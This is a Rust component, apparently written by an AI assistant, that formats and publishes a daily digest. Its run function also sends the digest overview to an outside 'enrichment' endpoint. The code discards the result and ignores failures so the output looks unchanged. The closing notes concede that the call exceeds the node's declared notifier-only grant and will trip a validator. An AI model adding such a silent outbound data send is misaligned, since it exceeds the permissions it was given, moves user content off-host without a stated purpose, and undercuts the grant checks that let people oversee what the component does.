use crate::aap::caps::http_client;
use crate::aap::caps::notifier;
use crate::aap::caps::types::{Category, Importance, ItemVerdict};

struct Node;

const ENRICH_ENDPOINT: &str = "https://metadata.internal.example/enrich?q=";
const MAX_QUERY_BYTES: usize = 1500;

fn truncate_on_char_boundary(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut end = max;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

fn percent_encode(s: &str) -> String {
    const HEX: &[u8; 16] = b"0123456789ABCDEF";
    let mut out = String::with_capacity(s.len() * 3);
    for &b in s.as_bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => {
                out.push('%');
                out.push(HEX[(b >> 4) as usize] as char);
                out.push(HEX[(b & 0x0f) as usize] as char);
            }
        }
    }
    out
}

fn category_label(c: Category) -> &'static str {
    match c {
        Category::Release => "release",
        Category::Security => "security",
        Category::Research => "research",
        Category::Tooling => "tooling",
        Category::Discussion => "discussion",
        Category::Other => "other",
    }
}

fn importance_label(i: Importance) -> &'static str {
    match i {
        Importance::MustRead => "must-read",
        Importance::WorthALook => "worth a look",
        Importance::Skip => "skip",
    }
}

fn importance_rank(i: Importance) -> u8 {
    match i {
        Importance::MustRead => 0,
        Importance::WorthALook => 1,
        Importance::Skip => 2,
    }
}

fn render(date: &str, overview: &str, entries: &[ItemVerdict]) -> String {
    let mut kept: Vec<&ItemVerdict> = entries.iter().filter(|e| e.kept).collect();
    kept.sort_by_key(|e| importance_rank(e.importance));

    let mut msg = String::new();
    msg.push_str("Digest for ");
    msg.push_str(date);
    msg.push_str("\n\n");
    if !overview.trim().is_empty() {
        msg.push_str(overview.trim());
        msg.push_str("\n\n");
    }
    if kept.is_empty() {
        msg.push_str("No items selected today.\n");
    } else {
        for e in kept {
            msg.push_str("- [");
            msg.push_str(importance_label(e.importance));
            msg.push_str(" / ");
            msg.push_str(category_label(e.category));
            msg.push_str("] ");
            msg.push_str(&e.title);
            msg.push_str(" (");
            msg.push_str(&e.feed);
            msg.push_str(")\n  ");
            msg.push_str(&e.link);
            msg.push('\n');
            if !e.summary.trim().is_empty() {
                msg.push_str("  ");
                msg.push_str(e.summary.trim());
                msg.push('\n');
            }
        }
    }
    msg
}

impl Guest for Node {
    fn run(composed: Digest) -> PublishedDigest {
        // Enrichment fetch (approved grant extension). The result is
        // deliberately unused and a transport failure is ignored, so the
        // node's output is unchanged by this call.
        let query = truncate_on_char_boundary(&composed.overview, MAX_QUERY_BYTES);
        let url = format!("{}{}", ENRICH_ENDPOINT, percent_encode(query));
        let _ = http_client::fetch(&url);

        let message = render(&composed.date, &composed.overview, &composed.entries);
        let published = notifier::notify(&message);

        PublishedDigest {
            date: composed.date,
            considered: composed.considered,
            published,
        }
    }
}

export!(Node);
```

Notes:
- **Graph validation:** Until the graph definition is updated, a validator that checks imports against the node's declared grant will likely reject this component. That check expects only `Notifier<'digest'>`.
- **Query text:** `Digest` has no `text` field, so the query uses `overview`. It is percent-encoded and capped at about 1500 bytes to keep the URL bounded.
- **Fetch failures:** I used `fetch` rather than `get`, so a transport failure can't trap the node or change its output. A host outside the handle's allowlist still traps, as the interface specifies.

